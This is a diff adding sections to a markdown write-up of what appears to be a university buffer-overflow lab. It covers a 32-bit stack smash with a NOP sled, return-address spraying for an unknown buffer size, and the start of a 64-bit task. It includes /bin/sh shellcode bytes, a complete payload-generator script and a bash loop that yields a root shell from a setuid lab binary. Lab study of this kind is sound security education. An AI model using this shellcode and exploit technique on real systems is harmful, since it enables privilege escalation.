@@ -316,3 +316,135 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
+What we want to do here is to overflow `buffer` in order to overwrite the return address on the stack with our own. Our own return address would then ideally point to the beginning of our shellcode -- but this is difficult. To overcome this, we use a `NOP` sled, i.e. we fill up the space between our return address and the shellcode with the `NOP` instruction (`0x90` in machine code), which simply does nothing and executes the next instruction. Thus, we simply need to point to anywhere within the region between the return address and the shellcode, and the shellcode will eventually be executed. 
+
+![Buffer overflow schematic](./img/bof_schematic.png "Buffer overflow schematic")
+
+First, we have to determine where -- in our payload -- to put in our target return address. We can use the fact that the return address is always at a **fixed** offset from the base pointer of the stack (`ebp`): the return address is always stored at `ebp+4` (for 32-bit systems). Thus, if we know the address of the buffer and the value of `ebp`, we can determine how much we should offset the return address in our payload.
+
+From our investigation with `gdb`, we found that
+
+```
+$ebp    = 0xffffcb48
+&buffer = 0xffffca70
+```
+
+Using Python, we can perform a simple calculation of the offset: 
+
+```python
+>>> ebp = 0xffffcb48
+>>> buffer = 0xffffca70
+>>> offset = (ebp+4) - buffer
+>>> print(offset)
+220
+```
+
+Secondly, we have to provide the address that we wish to return to. Noting that `ebp` will be larger when running the program directly (outside of `gdb`), and the fact that we only need to land into the `NOP` sled, the return address was picked to be `0xffffcbff`. 
+
+Overall, to acheive the buffer overflow, we used the following values in `exploit.py`:
+
+```python
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"    
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')     # Taken from 32-bit shellcode provided.
+
+start = 517 - len(shellcode)    # Place the shellcode at the end of the payload.
+
+ret    = 0xffffcbff       
+offset = 220              
+```
+*These values are saved into `exploit-L1.py`*
+
+The buffer overflow is successful, and we can use the command `id` to check that the **effective UID** is root. 
+
+![L1 success](./img/L1_success.png "L1 success")
+
+## Task 4: Launching the attack without knowing buffer size (Level 2)
+
+In the [previous task](#task-3-launching-the-attack-on-a-32-bit-program-level-1), we can find out the size of the buffer via `gdb`. In reality, this information may not be easily obtainable. For example, if the target is a server running on a remote machine, and we do not have the binary or source code. 
+
+In this task, we work under the constraint that the buffer size is unknown and cannot be determined. However, we know that the buffer size ranges from 100 to 200 bytes. The task is to exploit the vulnerability within this constraint. We solve this using a technique known as *spraying*: placing the target return address at every possible position.
+
+> In the original wording of task, we are meant to achieve the exploit using a **single** payload for any buffer size. However, through some exploration, it was discovered that the beginning of `buffer` is may not be aligned to the stack. i.e. in `gdb`, if we look at `&buffer` it may not be a multiple of 4. Thus, naively spraying may not work as the return address maybe slighly offset.
+>
+> ![Spraying offset](./img/spray_offset.png)
+>
+> In the example above, the buffer is 186 bytes. If we naively spray the target return address, the return address is subsequently offset by two bytes. Thus, it is not possible to use a single payload for any buffer size within the range. 
+
+In this situation, we will require four payloads. In each payload, we will offset the beginning of the spraying by `k` bytes (`k` = 0, 1, 2, 3). These four payloads together, will account for **all** possible buffer sizes within the range. 
+
+We use `exploit-L2.py` to craft the payload `badfile`. `exploit-L2.py` accepts a command-line argument at runtime to determine `k`. If no argument is provided, `k` defaults to zero.
+
+```python
+# exploit-L2.py
+
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+# Place shellcode into payload
+start = 517 - len(shellcode)
+content[start:start + len(shellcode)] = shellcode
+
+# Define the return address
+ret = 0xffffcbff
+
+# Decide where to put the return address,
+# we will spray it starting from the 100th byte.
+# but we need of offset it by k bytes(k = 0, 1, 2, 3).
+
+try:
+	# k should be given as a command line argument
+	k = int(sys.argv[1])
+except IndexError:
+	# If k is not given, default to 0.
+	k = 0
+
+offset = 100 + k
+L = 4
+
+# We will spray 120 bytes of it
+content[offset:offset + 120] = (ret).to_bytes(L,byteorder='little') * 30
+
+# We write the content to a file
+with open ('badfile', 'wb') as f:
+	f.write(content)
+```
+
+We can then automate the exploitation using a bash script `exploit-L2.sh`.
+
+```bash
+# exploit-L2.sh
+
+#!/bin/sh
+for K in 0 1 2 3
+do
+	echo "Using badfile with spray offset k = $K"
+	./exploit-L2.py $K
+	./stack-L2
+done
+```
+
+Running the script allows us to successfully obtain the shell with root permissions. 
+
+![stack-L2 success](./img/stack-L2_success.png "stack-L2 success")
+
+## Task 5: Launching the attack on a 64-bit program (Level 3)
+
+After investigating buffer overflows in 32-bit programs in the previous tasks, we will now look at buffer overflows in 64-bit programs. The `Makefile` compiles the 64-bit program `stack-L3` which we want to exploit in this task. 
+
+Noting that in 64-bit, the base pointer is `$rbp` instead of `$ebp`, we can find out the relevant addresses
+
+![stack-L3-dbg print](./img/stack-L3-dbg_print.png "stack-L3-dbg print")
+
